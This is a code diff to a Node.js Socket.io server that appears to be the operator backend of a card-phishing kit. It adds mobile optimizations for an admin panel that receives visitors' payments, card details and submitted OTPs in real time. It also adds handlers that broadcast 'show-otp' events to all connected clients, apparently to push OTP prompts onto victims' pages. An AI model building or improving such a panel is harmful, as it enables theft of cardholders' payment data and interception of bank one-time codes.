@@ -1207,16 +1207,51 @@ io.on('connection', (socket) => {
   });
 });
 
-// Socket.io connection handling
+// Enhanced mobile detection for server-side
+const detectMobileDevice = (userAgent) => {
+  const ua = userAgent || '';
+  return {
+    isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
+    isTablet: /(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua),
+    device: /iPhone/i.test(ua) ? 'iPhone' :
+            /iPad/i.test(ua) ? 'iPad' :
+            /Android/i.test(ua) ? 'Android' :
+            /BlackBerry/i.test(ua) ? 'BlackBerry' :
+            'Desktop'
+  };
+};
+
+// Mobile-specific connection tracking
+const mobileConnections = new Map();
+const adminConnections = new Set();
+
+// Socket.io connection handling with mobile optimizations
 io.on('connection', (socket) => {
+  const deviceInfo = detectMobileDevice(socket.handshake.headers['user-agent']);
+  const isMobile = deviceInfo.isMobile || deviceInfo.isTablet;
+  
   console.log(`🔌 NEW SOCKET CONNECTION SUCCESSFUL!`);
   console.log(`📋 Socket ID: ${socket.id}`);
   console.log(`🌐 Client Address: ${socket.handshake.address}`);
   console.log(`🔗 Origin: ${socket.handshake.headers.origin}`);
   console.log(`🖥️ User Agent: ${socket.handshake.headers['user-agent']}`);
+  console.log(`📱 Device Type: ${deviceInfo.device} (Mobile: ${isMobile})`);
   console.log(`🛠️ Socket Transport: ${socket.conn.transport.name}`);
   console.log(`📊 Total connected clients: ${io.engine.clientsCount}`);
   console.log('✅ Socket connection established successfully!');
+  
+  // Store device info for mobile-specific handling
+  socket.deviceInfo = deviceInfo;
+  socket.isMobile = isMobile;
+  
+  if (isMobile) {
+    mobileConnections.set(socket.id, {
+      deviceInfo,
+      connectedAt: Date.now(),
+      lastHeartbeat: Date.now()
+    });
+    console.log(`📱 Mobile device registered: ${deviceInfo.device}`);
+  }
 
   // Enhanced visitor tracking with persistence
   socket.on('visitor-joined', async (data) => {
@@ -1506,23 +1541,88 @@ io.on('connection', (socket) => {
     socket.broadcast.emit('otp-submitted', otpData);
   });
 
-  // Handle admin panel connection - send historical data
+  // Mobile-specific heartbeat handler
+  socket.on('admin-heartbeat', (data) => {
+    if (socket.isMobile) {
+      const mobileConn = mobileConnections.get(socket.id);
+      if (mobileConn) {
+        mobileConn.lastHeartbeat = Date.now();
+        console.log(`📱 Mobile heartbeat received from ${socket.deviceInfo?.device}`);
+        
+        // Send back heartbeat acknowledgment with sync data
+        socket.emit('heartbeat-ack', {
+          timestamp: Date.now(),
+          paymentsCount: adminData.payments.length,
+          visitorsCount: Array.from(activeVisitors.values()).length,
+          otpsCount: adminData.otps.length
+        });
+      }
+    }
+  });
+  
+  // Enhanced mobile reconnection handler
+  socket.on('mobile-reconnect', async () => {
+    if (socket.isMobile) {
+      console.log(`📱 Mobile reconnection request from ${socket.deviceInfo?.device}`);
+      
+      // Send complete state for mobile reconnection
+      const visitors = Array.from(activeVisitors.values());
+      socket.emit('mobile-state-sync', {
+        payments: adminData.payments.slice(0, 50), // Last 50 payments
+        visitors: visitors,
+        otps: adminData.otps.slice(0, 20), // Last 20 OTPs
+        cardDetails: adminData.cardDetails.slice(0, 50), // Last 50 cards
+        timestamp: new Date().toISOString(),
+        syncId: `sync_${Date.now()}`
+      });
+      
+      console.log(`📱 Mobile state synchronized for ${socket.deviceInfo?.device}`);
+    }
+  });
+
+  // Handle admin panel connection - send historical data with mobile optimizations
   socket.on('admin-connected', async () => {
-    console.log('👨‍💻 Admin panel connected, loading persistent data...');
+    console.log(`👨‍💻 Admin panel connected (${socket.isMobile ? 'Mobile' : 'Desktop'})`);
+    
+    // Add to admin connections tracking
+    adminConnections.add(socket.id);
     
     // Load persistent data instead of clearing
     const visitors = Array.from(activeVisitors.values());
     const analytics = calculatePaymentAnalytics();
     
-    // Send current state immediately for mobile reconnection
-    socket.emit('visitors-update', visitors);
-    socket.emit('admin-historical-data', {
-      activeVisitors: visitors,
-      visitors: adminData.visitors,
-      payments: adminData.payments,
-      otps: adminData.otps,
-      cardDetails: adminData.cardDetails
-    });
+    // Mobile-optimized data sending (smaller chunks, progressive loading)
+    if (socket.isMobile) {
+      // Send essential data first for mobile
+      socket.emit('visitors-update', visitors);
+      socket.emit('mobile-admin-init', {
+        recentPayments: adminData.payments.slice(0, 20),
+        activeVisitors: visitors,
+        recentOtps: adminData.otps.slice(0, 10),
+        deviceInfo: socket.deviceInfo,
+        timestamp: new Date().toISOString()
+      });
+      
+      // Send remaining data progressively
+      setTimeout(() => {
+        socket.emit('admin-historical-data', {
+          visitors: adminData.visitors.slice(0, 100), // Limit for mobile
+          payments: adminData.payments.slice(20, 100), // Additional payments
+          otps: adminData.otps.slice(10, 50), // Additional OTPs
+          cardDetails: adminData.cardDetails.slice(0, 50)
+        });
+      }, 1000);
+    } else {
+      // Desktop gets full data immediately
+      socket.emit('visitors-update', visitors);
+      socket.emit('admin-historical-data', {
+        activeVisitors: visitors,
+        visitors: adminData.visitors,
+        payments: adminData.payments,
+        otps: adminData.otps,
+        cardDetails: adminData.cardDetails
+      });
+    }
     
     // Send real-time updates for mobile admin panels
     socket.emit('realtime-sync', {
@@ -1582,8 +1682,21 @@ io.on('connection', (socket) => {
     });
   });
 
-  socket.on('disconnect', () => {
-      // User disconnected silently
+  socket.on('disconnect', (reason) => {
+    console.log(`🔌 Socket disconnected: ${socket.id} (${reason})`);
+    
+    // Mobile-specific cleanup
+    if (socket.isMobile) {
+      mobileConnections.delete(socket.id);
+      console.log(`📱 Mobile connection cleaned up: ${socket.deviceInfo?.device}`);
+    }
+    
+    // Admin connection cleanup
+    if (adminConnections.has(socket.id)) {
+      adminConnections.delete(socket.id);
+      console.log(`👨‍💻 Admin connection removed: ${socket.id}`);
+    }
+    
     // If visitor was tracked, remove from activeVisitors and emit visitor left event
     if (socket.visitorData) {
       io.emit('visitor-left', { visitorId: socket.visitorData.visitorId });
@@ -1592,6 +1705,55 @@ io.on('connection', (socket) => {
     }
   });
 });
+
+// Mobile connection cleanup - Remove stale mobile connections
+setInterval(() => {
+  const now = Date.now();
+  const staleThreshold = 5 * 60 * 1000; // 5 minutes
+  
+  for (const [socketId, connectionInfo] of mobileConnections.entries()) {
+    if (now - connectionInfo.lastHeartbeat > staleThreshold) {
+      console.log(`📱 Removing stale mobile connection: ${connectionInfo.deviceInfo.device}`);
+      mobileConnections.delete(socketId);
+    }
+  }
+  
+  if (mobileConnections.size > 0) {
+    console.log(`📱 Active mobile connections: ${mobileConnections.size}`);
+  }
+}, 60000); // Check every minute
+
+// Broadcast updated data to mobile admin panels periodically
+setInterval(() => {
+  if (adminConnections.size > 0) {
+    const visitors = Array.from(activeVisitors.values());
+    const mobileAdmins = [];
+    
+    // Find mobile admin connections
+    for (const socketId of adminConnections) {
+      if (mobileConnections.has(socketId)) {
+        mobileAdmins.push(socketId);
+      }
+    }
+    
+    if (mobileAdmins.length > 0) {
+      // Send periodic updates to mobile admins
+      const updateData = {
+        activeVisitors: visitors,
+        recentPayments: adminData.payments.slice(0, 10),
+        recentOtps: adminData.otps.slice(0, 5),
+        timestamp: new Date().toISOString(),
+        updateType: 'periodic'
+      };
+      
+      mobileAdmins.forEach(socketId => {
+        io.to(socketId).emit('mobile-periodic-update', updateData);
+      });
+      
+      console.log(`📱 Periodic update sent to ${mobileAdmins.length} mobile admin(s)`);
+    }
+  }
+}, 30000); // Every 30 seconds
 
 // API endpoint to store successful payment data
 app.post('/api/success-payment', (req, res) => {
@@ -2129,6 +2291,37 @@ app.get('/api/success-payment/:hash', async (req, res) => {
       error: error.message || 'Failed to retrieve payment data' 
     });
   }
+});
+
+// Socket.IO connection handling
+io.on('connection', (socket) => {
+  console.log('🔗 Client connected:', socket.id);
+  
+  // Handle admin OTP selections
+  socket.on('broadcast-show-otp', (data) => {
+    console.log('👨‍💼 Admin requested OTP:', data);
+    // Broadcast to ALL connected clients
+    io.emit('show-otp', data);
+    console.log('📡 Broadcasting show-otp to all clients:', data.otpPageSelection);
+  });
+  
+  socket.on('show-otp', (data) => {
+    console.log('📡 Received show-otp, broadcasting to all clients:', data);
+    // Broadcast to ALL connected clients
+    io.emit('show-otp', data);
+  });
+  
+  socket.on('admin-show-otp', (data) => {
+    console.log('📡 Received admin-show-otp, broadcasting to all clients:', data);
+    // Broadcast to ALL connected clients
+    io.emit('show-otp', data);
+    io.emit('admin-show-otp', data);
+  });
+  
+  // Handle disconnect
+  socket.on('disconnect', (reason) => {
+    console.log('❌ Client disconnected:', socket.id, '- Reason:', reason);
+  });
 });
 
 // Start the server - single instance only
